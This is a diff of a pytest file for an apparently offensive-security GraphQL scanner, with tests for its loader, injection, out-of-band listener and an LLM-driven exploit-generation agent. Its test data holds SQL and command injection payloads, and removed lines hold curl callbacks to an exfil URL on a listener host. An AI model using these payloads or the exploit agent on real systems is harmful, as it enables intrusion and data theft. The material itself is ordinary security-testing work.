@@ -5,7 +5,6 @@ Version: 3.4
 Date: February 2025
 """
 
-import asyncio
 import json
 import os
 import time
@@ -23,11 +22,10 @@ from grapeql.client import GraphQLClient
 from grapeql.tester import VulnerabilityTester
 from grapeql.fingerprint import Fingerprinter
 from grapeql.info_tester import InfoTester
-from grapeql.injection_tester import InjectionTester, OOBListener, OOBConnection
+from grapeql.injection_tester import InjectionTester
 from grapeql.auth_tester import AuthTester
 from grapeql.dos_tester import DosTester
 from grapeql.reporter import Reporter
-from grapeql.ai_agent import AIAgent
 
 
 # ===========================================================================
@@ -102,7 +100,6 @@ def tmp_dir(tmp_path):
 def sample_test_cases(tmp_dir):
     for mod, data in {
         "injection/sqli.yaml": {"test_cases": [{"name": "sqli_basic_or", "payload": "' OR 1=1 --", "indicators": ["SQL syntax", "MySQL"]}]},
-        "injection/oob.yaml": {"test_cases": [{"name": "oob_curl", "oob": True, "payload": "; curl CALLBACK/oob-curl"}]},
         "injection/command.yaml": {"test_cases": [{"name": "cmd_semicolon_id", "payload": "; id", "indicators": ["root:", "/bin/bash"]}]},
         "fingerprint/engines.yaml": {"test_cases": [{"engine_id": "test_engine", "name": "Test Engine", "cve": ["CVE-2099-0001"], "probes": [{"query": "{ __typename }", "expect_has_data": True}]}]},
         "info/checks.yaml": {"test_cases": [{"name": "introspection_enabled", "title": "Introspection Enabled", "severity": "MEDIUM", "method": "CHECK_SCHEMA", "detection": {"type": "schema_exists"}, "description": "Full schema exposed", "impact": "Schema mapping", "remediation": "Disable introspection"}]},
@@ -250,7 +247,7 @@ class TestGrapeLogger:
 class TestTestCaseLoader:
     def test_load_module(self, loader):
         names = {tc["name"] for tc in loader.load_module("injection")}
-        assert {"sqli_basic_or", "cmd_semicolon_id", "oob_curl"} <= names
+        assert {"sqli_basic_or", "cmd_semicolon_id"} <= names
 
     def test_load_module_nonexistent(self, loader):
         assert loader.load_module("nonexistent") == []
@@ -269,22 +266,22 @@ class TestTestCaseLoader:
     def test_malformed_yaml(self, sample_test_cases):
         (sample_test_cases / "injection" / "bad.yaml").write_text("{invalid yaml: [")
         cases = TestCaseLoader(str(sample_test_cases)).load_module("injection")
-        assert len(cases) >= 3  # 3 valid files still load
+        assert len(cases) >= 2  # 2 valid files still load
 
     def test_include_filter_single(self, loader):
         loader.set_include_files(["sqli.yaml"])
         names = {tc["name"] for tc in loader.load_module("injection")}
-        assert "sqli_basic_or" in names and "oob_curl" not in names
+        assert "sqli_basic_or" in names and "cmd_semicolon_id" not in names
 
     def test_include_filter_no_extension(self, loader):
-        loader.set_include_files(["oob"])
+        loader.set_include_files(["command"])
         names = {tc["name"] for tc in loader.load_module("injection")}
-        assert "oob_curl" in names and "sqli_basic_or" not in names
+        assert "cmd_semicolon_id" in names and "sqli_basic_or" not in names
 
     def test_include_filter_multiple(self, loader):
-        loader.set_include_files(["sqli", "oob"])
+        loader.set_include_files(["sqli", "command"])
         names = {tc["name"] for tc in loader.load_module("injection")}
-        assert "sqli_basic_or" in names and "oob_curl" in names and "cmd_semicolon_id" not in names
+        assert "sqli_basic_or" in names and "cmd_semicolon_id" in names
 
     def test_include_filter_no_match(self, loader):
         loader.set_include_files(["nonexistent.yaml"])
@@ -350,7 +347,7 @@ class TestVulnerabilityTester:
     def test_auto_load(self, loader):
         class FT(VulnerabilityTester):
             MODULE_NAME = "injection"
-        assert len(FT(loader=loader).test_cases) >= 3
+        assert len(FT(loader=loader).test_cases) >= 2
 
     def test_add_and_get_findings(self):
         t = VulnerabilityTester()
@@ -434,13 +431,8 @@ class TestInfoTester:
 class TestInjectionTester:
     def test_case_categorisation(self, loader):
         inj = InjectionTester(loader=loader)
-        assert any(tc["name"] == "oob_curl" for tc in inj._oob_cases)
         assert any(tc["name"] == "sqli_basic_or" for tc in inj._sqli_cases)
         assert any(tc["name"] == "cmd_semicolon_id" for tc in inj._cmd_cases)
-
-    def test_set_listener(self):
-        inj = InjectionTester(); inj.set_listener("10.0.0.5", 4444)
-        assert inj._listener and inj._listener.ip == "10.0.0.5" and inj._listener.port == 4444
 
     def test_build_query_mutation(self, loader):
         inj = InjectionTester(loader=loader); inj.client = _make_client_with_schema()
@@ -455,7 +447,6 @@ class TestInjectionTester:
         inj = InjectionTester()
         assert len(inj._get_sqli_payloads()) > 0
         assert len(inj._get_cmd_payloads()) > 0
-        assert len(inj._get_oob_payloads()) > 0
 
     @pytest.mark.asyncio
     async def test_sqli_detection(self, loader, baseline):
@@ -464,68 +455,6 @@ class TestInjectionTester:
         inj.client.graphql_query = AsyncMock(return_value=({"errors": [{"message": "SQL syntax error near 'OR 1=1'"}]}, None))
         findings = await inj.run_test()
         assert any("SQL" in f.title or "Injection" in f.title for f in findings)
-
-
-# ===========================================================================
-#  OOBListener
-# ===========================================================================
-
-class TestOOBListener:
-    def test_properties(self):
-        L = OOBListener("10.0.0.5", 4444)
-        assert L.callback_address == "10.0.0.5:4444"
-        assert L.callback_http == "http://10.0.0.5:4444"
-
-    @pytest.mark.asyncio
-    async def test_start_stop(self):
-        L = OOBListener("127.0.0.1", 0)
-        assert await L.start()
-        assert L._server is not None
-        await L.stop()
-        assert L._server is None
-
-    @pytest.mark.asyncio
-    async def test_connection_recording(self):
-        L = OOBListener("127.0.0.1", 0)
-        await L.start()
-        port = L._server.sockets[0].getsockname()[1]
-        L.set_current_payload("test_payload")
-
-        reader, writer = await asyncio.open_connection("127.0.0.1", port)
-        writer.write(b"GET /test HTTP/1.1\r\n\r\n"); await writer.drain()
-        await reader.read(1024); writer.close(); await writer.wait_closed()
-        await asyncio.sleep(0.5)
-
-        conns = L.drain()
-        assert len(conns) == 1 and conns[0].payload_name == "test_payload"
-        assert "GET /test" in conns[0].data
-        assert L.drain() == []  # drain clears
-        await L.stop()
-
-
-# ===========================================================================
-#  OOB Placeholder Replacement (regression)
-# ===========================================================================
-
-class TestOOBPlaceholderReplacement:
-    def test_correct_order(self):
-        raw = 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT) }'
-        q = raw.replace("CALLBACK_HOST", "10.0.0.5")
-        q = q.replace("CALLBACK_PORT", "4444")
-        q = q.replace("CALLBACK", "http://10.0.0.5:4444")
-        assert 'host: "10.0.0.5"' in q and "port: 4444" in q
-
-    def test_wrong_order_corruption(self):
-        raw = 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT) }'
-        bad = raw.replace("CALLBACK", "http://10.0.0.5:4444")
-        assert "_HOST" in bad  # proves corruption
-
-    def test_generic_payload(self):
-        p = "; curl CALLBACK/exfil"
-        r = p.replace("CALLBACK_HOST", "10.0.0.5")
-        r = r.replace("CALLBACK_PORT", "4444")
-        r = r.replace("CALLBACK", "http://10.0.0.5:4444")
-        assert r == "; curl http://10.0.0.5:4444/exfil"
 
 
 # ===========================================================================
@@ -604,55 +533,6 @@ class TestDosTester:
 
 
 # ===========================================================================
-#  AIAgent
-# ===========================================================================
-
-class TestAIAgent:
-    def test_build_prompt(self, sample_findings):
-        p = AIAgent()._build_user_prompt("http://x/graphql", sample_findings)
-        assert "http://x/graphql" in p and "Findings" in p
-
-    def test_build_prompt_schema(self, sample_findings):
-        p = AIAgent()._build_user_prompt("http://x/graphql", sample_findings, {"types": []})
-        assert "GraphQL Schema" in p
-
-    @pytest.mark.asyncio
-    async def test_analyse_empty(self):
-        assert await AIAgent().analyse("http://x/graphql", []) is None
-
-    @pytest.mark.asyncio
-    async def test_analyse_success(self, sample_findings):
-        mock_resp = MagicMock(status_code=200)
-        mock_resp.json.return_value = {
-            "choices": [{"message": {"content": "## AI Analysis\nDone."}}]
-        }
-        with patch("grapeql.qwen.httpx.AsyncClient") as MC:
-            mc = AsyncMock(); mc.post.return_value = mock_resp
-            mc.__aenter__ = AsyncMock(return_value=mc); mc.__aexit__ = AsyncMock(return_value=False)
-            MC.return_value = mc
-            r = await AIAgent().analyse("http://x/graphql", sample_findings)
-            assert r and "AI Analysis" in r
-
-    @pytest.mark.asyncio
-    async def test_analyse_api_error(self, sample_findings):
-        mock_resp = MagicMock(status_code=500, text="err")
-        with patch("grapeql.qwen.httpx.AsyncClient") as MC:
-            mc = AsyncMock(); mc.post.return_value = mock_resp
-            mc.__aenter__ = AsyncMock(return_value=mc); mc.__aexit__ = AsyncMock(return_value=False)
-            MC.return_value = mc
-            assert await AIAgent().analyse("http://x/graphql", sample_findings) is None
-
-    @pytest.mark.asyncio
-    async def test_analyse_unreachable(self, sample_findings):
-        import httpx
-        with patch("grapeql.qwen.httpx.AsyncClient") as MC:
-            mc = AsyncMock(); mc.post.side_effect = httpx.ConnectError("down")
-            mc.__aenter__ = AsyncMock(return_value=mc); mc.__aexit__ = AsyncMock(return_value=False)
-            MC.return_value = mc
-            assert await AIAgent().analyse("http://x/graphql", sample_findings) is None
-
-
-# ===========================================================================
 #  Reporter
 # ===========================================================================
 
@@ -676,12 +556,6 @@ class TestReporter:
         r.print_summary()
         out = capsys.readouterr().out
         assert "Findings Summary" in out and "Total: 3" in out
-
-    def test_print_summary_with_ai(self, sample_findings, capsys):
-        r = Reporter(); r.add_findings(sample_findings)
-        r.set_ai_summary("## AI Analysis\nSummary.")
-        r.print_summary()
-        assert "AI Analysis" in capsys.readouterr().out
 
     def test_print_summary_empty(self, capsys):
         Reporter().print_summary()
@@ -717,16 +591,12 @@ class TestCLI:
             "--auth-type", "Token", "--cookie", "s:v",
             "--username", "u", "--password", "p",
             "--log-file", "l.log", "--schema-file", "s.json",
-            "--include", "sqli.yaml", "oob.yaml",
-            "--listener-ip", "10.0.0.5", "--listener-port", "4444",
-            "--ai", "--ai-model", "qwen2.5-coder:7b",
+            "--include", "sqli.yaml", "command.yaml",
         ]
         with patch("sys.argv", argv):
             a = GrapeQL().parse_arguments()
         assert a.modules == ["fingerprint", "injection"]
-        assert a.include == ["sqli.yaml", "oob.yaml"]
-        assert a.listener_ip == "10.0.0.5" and a.listener_port == 4444
-        assert a.ai is True and a.ai_model == "qwen2.5-coder:7b"
+        assert a.include == ["sqli.yaml", "command.yaml"]
 
     def test_missing_api(self):
         from grapeql.cli import GrapeQL
@@ -810,18 +680,21 @@ class TestExploitTemplate:
         compile(src, "exploit.py", "exec")
         assert "def build_request" in src and "def check_success" in src
 
-    def test_initial_prompt_has_three_inputs(self):
+    def test_initial_prompt_has_four_inputs(self):
         from webapi.exploit_agent import _build_initial_prompt, _make_marker
         f = self._finding()
         f["evidence"]["query"] = "mutation { login }"
         p = _build_initial_prompt(
             "http://localhost:5013/graphql", f, {"types": [{"name": "Query"}]},
+            {"name": "Apollo Server", "technologies": ["Node.js"]},
             _make_marker(),
         )
-        # INPUT 1: triggering request + target URL, INPUT 2: schema, INPUT 3: template.
+        # INPUT 1: triggering request + target URL, INPUT 2: fingerprinted stack,
+        # INPUT 3: schema, INPUT 4: template.
         assert "INPUT 1" in p and "http://localhost:5013/graphql" in p
-        assert "INPUT 2" in p and '"types"' in p
-        assert "INPUT 3" in p and "def send_graphql" in p
+        assert "INPUT 2" in p and "Apollo Server" in p
+        assert "INPUT 3" in p and '"types"' in p
+        assert "INPUT 4" in p and "def send_graphql" in p
 
     @pytest.mark.asyncio
     async def test_unverified_ships_evidence_not_model_guess(self):
@@ -859,12 +732,51 @@ class TestExploitTemplate:
         assert "UNVERIFIED" in code
 
     @pytest.mark.asyncio
+    async def test_evidence_payload_reused_and_verified_by_indicator(self):
+        """With captured evidence, the PoC reuses the scanner's exact confirming
+        payload and verifies via the scanner's matched indicator — deterministic,
+        without ever calling the model."""
+        from webapi import exploit_agent as ea
+        finding = {
+            "title": "SQLi in pastes.filter", "severity": "CRITICAL",
+            "evidence": {
+                "query": "query { pastes(filter: \"' OR 1=1 --\") { id } }",
+                "variables": None, "payload": "' OR 1=1 --",
+                "field": "pastes.filter", "matched_indicator": "SQL syntax",
+            },
+        }
+        chat_calls = {"n": 0}
+
+        async def fake_chat(messages, **kw):
+            chat_calls["n"] += 1
+            return {"choices": [{"message": {"content": "unused"}}]}
+
+        async def fake_run(http, target, query, variables, headers):
+            assert query == finding["evidence"]["query"]  # replays scanner query verbatim
+            return 'HTTP 200\n{"errors":[{"message":"error in your SQL syntax near ..."}]}'
+
+        with patch.object(ea, "chat_completion", fake_chat), \
+                patch.object(ea, "_run_graphql", fake_run):
+            res = await ea.generate_exploit(
+                target="http://localhost:5013/graphql", finding=finding, schema=None,
+            )
+        code = res["exploit_code"]
+        compile(code, "exploit.py", "exec")
+        assert chat_calls["n"] == 0              # LLM never consulted
+        assert res["confirmed"] is True          # indicator reflected in live response
+        assert "' OR 1=1 --" in code             # scanner's exact payload
+        assert "SQL syntax" in code              # scanner's matched indicator
+        assert "CONFIRMED" in code
+
+    @pytest.mark.asyncio
     async def test_bogus_confirmed_is_downgraded(self):
-        """A CONFIRMED claim is rejected unless the proof token was reflected."""
+        """A CONFIRMED claim from the agent is rejected unless the proof token was
+        reflected. This is the no-evidence fallback path (no captured request to
+        replay), so the agentic loop and its marker guard run."""
         from webapi import exploit_agent as ea
         finding = {
             "title": "Command Injection in pastes.filter", "severity": "CRITICAL",
-            "evidence": {"query": "{ pastes { id } }", "payload": "x", "field": "pastes.filter"},
+            "evidence": {"payload": "x", "field": "pastes.filter"},  # no captured query
         }
 
         async def fake_chat(messages, **kw):
